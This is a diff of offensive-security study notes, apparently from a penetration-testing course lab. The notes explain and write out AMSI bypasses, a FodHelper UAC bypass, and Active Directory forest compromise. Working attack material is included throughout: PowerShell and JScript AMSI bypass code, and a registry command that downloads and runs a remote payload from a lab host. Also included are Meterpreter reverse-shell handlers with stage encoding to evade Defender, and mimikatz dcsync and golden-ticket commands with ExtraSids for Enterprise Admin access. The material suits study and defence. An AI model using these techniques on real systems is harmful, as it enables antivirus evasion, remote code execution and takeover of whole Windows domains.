@@ -2342,15 +2342,65 @@ sendEmail -f <email>  -t <email> -u “Report to Review” -m “Please review t
 
 ## Bypassing AMSI With Reflection in PowerShell
 
+We purposely downloaded and executed the code directly in memory without giving the AV a chance to scan it.
+
+=> Antimalware Scan Interface (AMSI)
+
+AMSI is a set of **APIs** that allow AV products to scan PowerShell commands and scripts when they are executed, even if they are never written to disk.
+
+The unmanaged dynamic link library `AMSI.DLL` is loaded into every PowerShell and PowerShell_ISE process.
+
+Relevant information captured by these APIs is forwarded to **Windows Defender** through Remote Procedure Call (RPC).
+
+After Windows Defender analyzes the data, the result is sent back to `AMSI.DLL` inside the PowerShell process.
+
+When PowerShell is launched, it loads `AMSI.DLL` and calls **AmsiInitialize**. AmsiInitialize takes place before we are able to invoke any PowerShell commands, which means we cannot influence it in any way. Once AmsiInitialize is complete and the **amsiContext** context structure is created.
+
+When we execute a PowerShell command, the **AmsiOpenSession** API is called. AmsiOpenSession accepts the amsiContext context structure and creates a session structure to be used in all calls within that session.
+
+**AmsiScanString** and **AmsiScanBuffer** can both be used to capture the console input or script content either as a string or as a binary buffer respectively.
+
+Note that AmsiScanBuffer supersedes AmsiScanString.
+
+Windows Defender scans the buffer passed to AmsiScanBuffer and returns the **AMSI_RESULT** enum. A return value of "32768" indicates the presence of malware, and "1" indicates a clean scan.
+
+Once the scan is complete, calling **AmsiCloseSession** will close the current AMSI scanning session.
+
+If the context structure has been corrupted, i.e. the first 4 bytes of amsiContext do not match the header values (ASCII representation of "AMSI"), AmsiOpenSession will return an error => effectively shut down AMSI without affecting PowerShell.
+
 ```pwsh
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
+
+Manipulating a result variable set by AmsiInitialize can also lead to another AMSI bypass through the amsiInitFailed field. The **amsiInitFailed** field is verified by **AmsiOpenSession** in the same manner as the amsiContext header, which leads to an error.
+
+Note: The AMSI bypass still works, but the substrings 'AmsiUtils' and 'amsiInitFailed' have since been flagged as malicious.
 
 ```pwsh
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
 ```
 
 ## Wrecking AMSI in PowerShell
+
+Modify the assembly instructions themselves instead of the data they are acting upon in a technique known as **binary patching**.
+
+The 2 first instructions in **AmsiOpenSession** are a **TEST** followed by a conditional jump. This specific conditional jump is called jump if equal (JE) and depends on a CPU flag called the zero flag (ZF).
+
+=> Overwrite the `TEST RDX,RDX` with an `XOR RAX,RAX` instruction, forcing the execution flow to the error branch, which will disable AMSI.
+
+The replacement has to use up the same amount of memory. (3 bytes)
+
+To resolve the address of AmsiOpenSession, we would typically call **GetModuleHandle** to obtain the base address of `AMSI.DLL`, then call **GetProcAddress**.
+
+In Windows, all memory is divided into 0x1000-byte pages. A memory protection setting is applied to each page, describing the permissions of data on that page.
+
+Normally, code pages are set to **PAGE_EXECUTE_READ**, or 0x20, i.e., we can read and execute this code, but not write to it.
+
+Since we want to overwrite three bytes on this page, we must first change the memory protection. => Win32 **VirtualProtect** API.
+
+The 3rd argument (flNewProtect) dictates the memory protection we want to apply to the page. Set this to **PAGE_EXECUTE_READWRITE** (0x40).
+
+To conserve memory, Windows shares `AMSI.DLL` between processes that use it. The new memory protection is set to **PAGE_EXECUTE_WRITECOPY** which is equivalent to PAGE_EXECUTE_READWRITE but it is a private copy used only in the current process.
 
 ```pwsh
 function LookupFunc {
@@ -2402,11 +2452,59 @@ $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
 
 ## FodHelper UAC Bypass
 
-### run4.txt
+`Fodhelper.exe` application is used to manage optional features like region-specific keyboard settings.
+
+The Fodhelper binary runs as high integrity, and is vulnerable to exploitation due to the way it interacts with the the current user's registry.
+
+Fodhelper tries to locate the following registry key, which does not exist by default in Windows 10: `HKCU:\Software\Classes\ms-settings\shell\open\command`
+
+If we create the registry key and add the **DelegateExecute** value, Fodhelper will search for the default value (Default) and use the content of the value to create a new process.
+
+### Metasploit UAC bypass module (Not working)
+
+AMSI stops the default Metasploit fodhelper module from bypassing UAC and even kills the existing Meterpreter session.
+
+target 1 == Windows x64
+
+```
+use exploit/windows/local/bypassuac_fodhelper
+show targets
+set target 1
+sessions -l
+set session 1
+set payload windows/x64/meterpreter/reverse_https
+set lhost 192.168.119.120
+set lport 444
+exploit
+```
+
+### Improving Fodhelper
+
+Meterpreter payload has been flagged after the 2nd stage payload has been sent.
+
+=> Windows Defender monitored the network interface and subsequently detected the unencrypted and unencoded second stage.
+
+=> Avoid this by enabling the advanced **EnableStageEncoding** option along with **StageEncoder** in Metasploit.
+
+```bash
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
+```
+
+```pwsh
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run4.txt') | IEX" -Force
+
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+
+C:\Windows\System32\fodhelper.exe
+```
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
 ```
+
+Modify the shellcode runner `run.txt` to include one of the AMSI bypasses
+
+`run4.txt`
 
 ```pwsh
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
@@ -2459,39 +2557,27 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
 
-```bash
-msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
-```
-
-Launch the high-integrity PowerShell prompt
-
-```pwsh
-New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run4.txt') | IEX" -Force
-
-New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
-
-C:\Windows\System32\fodhelper.exe
-```
-
-### Metasploit UAC bypass module
-
-```
-use exploit/windows/local/bypassuac_fodhelper
-show targets
-set target 1
-sessions -l
-set session 1
-set payload windows/x64/meterpreter/reverse_https
-set lhost 192.168.119.120
-set lport 444
-exploit
-```
-
 ## Bypassing AMSI in JScript
+
+Jscript handles each command in a single session while PowerShell processes each in a separate session.
+
+=> AmsiScanString and AmsiScanBuffer were called but AmsiOpenSession was not.
 
 ### Registry Key
 
-Prepend below code to the DotNetToJscript-generated shellcode runner to bypass AMSI and generate a reverse shell.
+Jscript tries to query the "AmsiEnable" registry key before initializing AMSI (`HKCU\SOFTWARE\Microsoft\Windows Script\Settings\AmsiEnable`). If this key is set to "0", AMSI is not enabled for the Jscript process.
+
+This query is performed in the **JAmsi::JAmsiIsEnabledByRegistry** function inside `Jscript.dll`, which is only called when `wscript.exe` is started.
+
+The `cscript.exe` executable, which is the command-line equivalent of `wscript.exe`.
+
+Use -e to specify which scripting engine will execute the script.
+
+The globally unique identifier (GUID) may be understood as a registry entry under `HKLM\SOFTWARE\Classes\CLSID`.
+
+In essence, the -e option indicates that the specified script file will be processed by `jscript.dll`.
+
+Prepend below code to the DotNetToJscript-generated shellcode runner to bypass AMSI.
 
 ```js
 var sh = new ActiveXObject('WScript.Shell');
@@ -2510,6 +2596,20 @@ try{
 ```
 
 ### Rename wscript.exe to amsi.dll and executing it
+
+AMSI requires `AMSI.DLL`.
+
+If a process named "`amsi.dll`" tries to load a DLL of the same name, **LoadLibraryExW** will report that it's already in memory and abort the load.
+
+=> Rename `wscript.exe` to `amsi.dll` and executing it.
+
+Any subsequent attempts to use the AMSI APIs will fail, causing AMSI itself to fail and be disabled, leaving us with an AMSI bypass.
+
+Note that double-clicking or running a file with a `.dll` extension will fail since DLLs are normally loaded, not executed. This behavior is  caused by the Win32 **ShellExecute** API, which is used by `cmd.exe`.
+
+However, if we instead use the **CreateProcess** Win32 API, the file extension is ignored and the file header would be parsed to determine if it is a valid executable. We can use the **Exec** method of the **WScript.Shell** object since it's just a wrapper for it.
+
+When the Jscript is executed, it will copy `wscript.exe` to a writable and executable folder, naming it "`amsi.dll`". Then, it will execute this copy while supplying the original Jscript file.
 
 Prepend below code to the DotNetToJscript-generated shellcode runner
 
@@ -2679,6 +2779,7 @@ namespace Bypass
 
 ```bat
 C:\Windows\Tasks\Bypass.exe
+
 type C:\Tools\test.txt
 ```
 
@@ -6368,7 +6469,7 @@ It may be necessary to run the tool multiple times before the change notificatio
 Switch back to Rubeus, which displays the TGT for the domain controller account:
 
 ```
-[*] 4/13/2020 2:45:16 PM UTC - Found new TGT:
+[*] ... - Found new TGT:
 
   User                  : CDC01$@PROD.CORP1.COM
   ...
@@ -6646,6 +6747,318 @@ We can use our CIFS access to obtain code execution on appsrv01, but in the proc
 
 U> our access will be limited to appsrv01 and cannot directly be used to expand access towards the rest of the domain.
 
-## Active Directory Forest Theory
+## Active Directory Forest
 
-## Active Directory Trust in a Forest
+Trust allows two or more domains to extend Kerberos authentication to each other.
+
+E.g., Domain A trusts Domain B => users of Domain B are able to access resources, like files and shares inside Domain A.
+
+Trust can be configured from Domain A to Domain B, i.e. a **one-way trust**.
+
+Trust can also be configured from Domain B to Domain A, => a two-way or **bi-directional trust**.
+
+An AD **Forest**, essentially a parent container for a number of domains.
+
+1. A domain tree: The `Corp.com` root domain has a bi-directional trust to the `Prod.Corp.com` child domain. This is configured by default in AD and is known as **parent-child trust**. Likewise, a parent-child trust exists between `Prod.Corp.com` and `Factory.Prod.Corp.com`.
+
+Parent-child trust is **transitive**.
+
+Since `Corp.com` trusts `Prod.Corp.com`, and `Prod.Corp.com` trusts `Factory.Prod.Corp.com`
+
+=> `Corp.com` also trusts `Factory.Prod.Corp.com`.
+
+2. Domain tree with branches: A forest can contain multiple trees and each tree can contain branches.
+ 
+Due to the transitivity in parent-child trust, `FactoryB.Prod.Corp.com` trusts `Dev.Corp.com` but the authentication path has to go through both `Prod.Corp.com` and `Corp.com`, which will slow authentication.
+
+To improve efficiency, a **shortcut trust** can be established between `FactoryB.Prod.Corp.com` and `Dev.Corp.com`. This type of trust is also **transitive** and can occur between 2 domains organized within the same or separate trees.
+
+The **Enterprise Admins** group is a powerful group that only exists in the **root domain**.
+
+Members of the **Domain Admins** group have full control over a specific domain, but their administrative access does **not** extend beyond that domain.
+
+Members of the **Enterprise Admins** group are automatically a domain administrator in every domain in the forest.
+
+## Enumeration in the Forest
+
+Enumerate available trusts
+
+Use the built-in `nltest.exe` application. We can use the /trusted_domains flag to enumerate any domains trusted by our current domain.
+
+```bat
+nltest /trusted_domains
+```
+
+```
+List of domain trusts:
+    0: CORP1 corp1.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
+    1: PROD prod.corp1.com (NT 5) (Forest: 0) (Primary Domain) (Native)
+```
+
+**Primary Domain** note. indicates our current domain (`prod.corp1.com`)
+
+The domain `corp1.com`:
+
+1. **Forest Tree Root** => This is the root domain inside the forest.
+
+2. **Direct Outbound** and **Direct Inbound** indicate that our current domain has a direct **bi-directional trust** to it.
+
+3. The name of the root domain is listed as `corp1.com`.
+
+Enumerate domain trust with .NET
+
+```pwsh
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+```
+
+```
+SourceName     TargetName   TrustType TrustDirection
+----------     ----------   --------- --------------
+prod.corp1.com corp1.com  ParentChild  Bidirectional
+```
+
+Our current domain (`prod.corp1.com`) has a parent-child domain trust that is bi-directional to `corp1.com`.
+
+Enumerate domain trust using Win32 **DsEnumerateDomainTrusts** API.
+
+```pwsh
+Get-DomainTrust -API
+```
+
+```
+SourceName        : PROD.CORP1.COM
+TargetName        : corp1.com
+TargetNetbiosName : CORP1
+Flags             : IN_FOREST, DIRECT_OUTBOUND, TREE_ROOT, DIRECT_INBOUND
+ParentIndex       : 0
+TrustType         : UPLEVEL
+TrustAttributes   : WITHIN_FOREST
+TargetSid         : S-1-5-21-1095350385-1831131555-2412080359
+
+SourceName        : PROD.CORP1.COM
+TargetName        : prod.corp1.com
+TargetNetbiosName : PROD
+Flags             : IN_FOREST, PRIMARY, NATIVE_MODE
+ParentIndex       : 0
+TrustType         : UPLEVEL
+TrustAttributes   : 0
+TargetSid         : S-1-5-21-3776646582-2086779273-4091361643
+```
+
+**Get-DomainTrust** will use the .NET method if we specify the `-NET` flag.
+
+```pwsh
+Get-DomainTrust -NET
+```
+
+Note: If `corp1.com` had not been the tree root, list all domain trusts for `corp1.com`:
+
+```pwsh
+Get-DomainTrust -Domain corp1.com
+``` 
+
+Using this approach, we could map out all the available trust relationships inside the forest.
+
+Since a domain trust creates a **Trusted Domain Object** (TDO), we can query its properties with LDAP.
+
+Enumerating domain trust with **LDAP**
+
+```pwsh
+Get-DomainTrust
+```
+
+```
+SourceName      : prod.corp1.com
+TargetName      : corp1.com
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+```
+
+The .NET **DirectorySearcher** class, which can perform LDAP queries, can be initialized with a **DirectoryEntry** object. This object is created based on the **LDAP path** of the domain controller to query.
+
+If a domain controller in a trusted domain is used, like rdc01 instead of cdc01 in the current domain, then we can execute LDAP queries in any trusted domain.
+
+This allows us to reuse the same techniques across the entire forest.
+
+PowerView implements this through the `-Domain` option on many of its commands.
+
+Enumerate of users in the trusted `corp1.com`domain:
+
+```pwsh
+Get-DomainUser -Domain corp1.com
+```
+
+```pwsh
+Get-DomainUser -Domain corp1.com -Server "DC01:3268"
+```
+
+Note: The BloodHound Ingestor works with domain trust and allows enumeration of the entire forest.
+
+## Burning Down the Forest
+
+Leverage a compromised domain admin account in a child domain and unconstrained Kerberos delegation
+
+### Owning the Forest with Extra SIDs
+
+Escalate our privileges from domain admin of one domain to Enterprise admin.
+
+The most direct way is to compromise the root domain and obtain Enterprise Admin group membership.
+
+Leverage extra SIDs, a field inside a TGT or TGS.
+
+A few details of the Kerberos protocol:
+
+- When the user performs a logon authentication, a TGT is created by the domain controller and is encrypted with the krbtgt account password hash. This is what we leverage when we create a golden ticket to obtain unlimited access and persistence in the domain.
+
+- The user's logon and authorization information is stored within a structure called **KERB_VALIDATION_INFO** inside the TGT. Among other things, this structure contains a list of group memberships identified by SIDs.
+
+When we craft a golden ticket, we create a TGT with our desired group membership. The **ExtraSids** field within the KERB_VALIDATION_INFO structure includes SIDs that originate in a **foreign domain** and show membership in a trusted domain.
+
+ExtraSids can be used during AD domain migrations to grant access from one domain to another.
+
+A user from Domain A with ExtraSids assigned from Domain B is able to access content inside the trusted domain according to the group memberships the ExtraSids translate to.
+
+The technical implementation of Kerberos authentication across domains depends on the **trust key**.
+
+When the domain trust is established, a new computer account with the name of the trusted domain is also created. In `prod.corp1.com`, the computer account is called `corp1$`, which is also referred to as the trust account. The shared secret is the password hash of corp1$.
+
+For a bi-directional trust like that of parent and child domains, both `prod.corp1.com` and `corp1.com` create the trust account. The name of the account is always the same as the trusted domain, so inside `corp1.com` it is called `prod$`, but both prod$ and corp1$ have the same password hash.
+
+Obtain the NTLM hash of the trust account from the domain controller.
+
+Dcsync query Trust key for CORP1$ run as the admin domain administrator user
+
+```
+lsadump::dcsync /domain:prod.corp1.com /user:corp1$
+```
+
+If a user in `prod.corp1.com` wants to access a service in `corp1.com`, the domain controller in `prod.corp1.com` will create a TGT for `corp1.com` and indicate that it's a referral to a TGS.
+
+This TGT is not signed by the krbtgt password hash but instead with the trust key.
+
+Attempt to access the CIFS service of `rdc01.corp1.com` as the Offsec user inside the `prod.corp1.com` domain will fail since the Offsec user is not a **local administrator** on rdc01.corp1.com, but the tickets will be generated regardless.
+
+Before executing this, we should log out and log back in to clear all cached Kerberos tickets.
+
+```bat
+dir \\rdc01.corp1.com\c$
+
+klist
+```
+
+Tickets requested for cross domain authentication
+
+```
+Cached Tickets: (3)
+
+#0>     Client: offsec @ PROD.CORP1.COM
+        Server: krbtgt/CORP1.COM @ PROD.CORP1.COM
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        ...
+        Cache Flags: 0
+        Kdc Called: CDC01.prod.corp1.com
+
+#1>     Client: offsec @ PROD.CORP1.COM
+        Server: krbtgt/PROD.CORP1.COM @ PROD.CORP1.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        ...
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: CDC01.prod.corp1.com
+
+#2>     Client: offsec @ PROD.CORP1.COM
+        Server: CIFS/rdc01.corp1.com @ CORP1.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        ...
+        Cache Flags: 0
+        Kdc Called: RDC01.corp1.com
+```
+
+klist command shows that Kerberos tickets were requested.
+
+- Ticket 1 is a TGT for the `prod.corp1.com` domain. This is our regular TGT and is encrypted with the **krbtgt hash** of our current domain.
+
+- Ticket 0 is a TGT for the `corp1.com` domain but it is still generated by the domain controller in our current domain. This TGT is encrypted by the **trust key** and then forwarded to the domain controller in `corp1.com`.
+
+- Ticket 2 is a TGS for the CIFS service on `rdc01.corp1.com`, which is created by the domain controller in `corp1.com` and returned to us.
+
+If we compromise the krbtgt account password of our current domain, we can craft a golden ticket that contains an ExtraSid with group membership of **Enterprise Admins**.
+
+This golden ticket will get rewritten by the domain controller in the current domain with the trust key before going to the parent domain.
+
+This technique will allow us to jump directly from our current domain to the root domain as a member of Enterprise Admins, effectively making us Domain Admins in all domains in the forest.
+
+Open a command prompt as the admin user, which is a member of the Domain Admins group in `prod.corp1.com`. This will simulate our compromise of the domain and allow us to obtain the krbtgt password hash.
+
+Use the dcsync command to force a replication of the password hash for the krbtgt account:
+
+```
+lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+```
+
+With the NTLM hash for the krbtgt account from `prod.corp1.com`, we can create a golden ticket.
+
+As part of the kerberos::golden command's arguments, we will need the domain SID for both domains. We can obtain these with Get-DomainSID from PowerView:
+
+```pwsh
+Get-DomainSID -Domain prod.corp1.com
+
+Get-DomainSid -Domain corp1.com
+```
+
+The **RID** of the Enterprise Admins group is a static value of **519**.
+
+Append the value "519" to the domain SID to obtain the SID of the **Enterprise Admins** group.
+
+Crafting the golden ticket with ExtraSid that will grant us Enterprise Admin membership in `corp1.com`.
+
+Supply
+- the username inside `prod.corp1.com` (which does not have to be valid),
+- the origin domain (/domain),
+- the origin domain SID (/sid),
+- the krbtgt password hash (/krbtgt),
+- the ExtraSid value (Enterprise Admins SID) through the /sids: option.
+- the /ptt flag to inject the ticket into memory:
+
+```
+kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
+
+exit
+```
+
+Prove our access to rdc01 (the root domain controller) with PsExec:
+
+```bat
+c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
+```
+
+List the group memberships
+
+```bat
+whoami /groups
+```
+
+We are now a member of Enterprise Admins.
+
+=> Compromise of one domain can lead to the compromise od every single domain in the forest.
+
+ExtraSids can be blocked between domains in the same forest with **domain quarantine** which can be configured with the **Netdom** tool. However, this also blocks legitimate access so this solution is rarely implemented.
+
+Find the **trust key** for `corp1.com` and use it to craft a golden ticket instead of the krbtgt password hash. (not working)
+
+[Rubeus2](https://github.com/Flangvik/SharpCollection/tree/master/)
+
+```
+lsadump::dcsync /domain:prod.corp1.com /user:prod\corp1$
+
+kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /rc4:d6eba9e9b9bb466be9d9d20c5584c9ef /service:krbtgt /target:corp1.com /ticket:trust_key.kirbi
+
+Rubeus2.exe asktgs /ticket:trust_key.kirbi /dc:rdc01.corp1.com /service:cifs/rdc01.corp1.com /ptt
+```
+
+### Owning the Forest with Printers
+
+
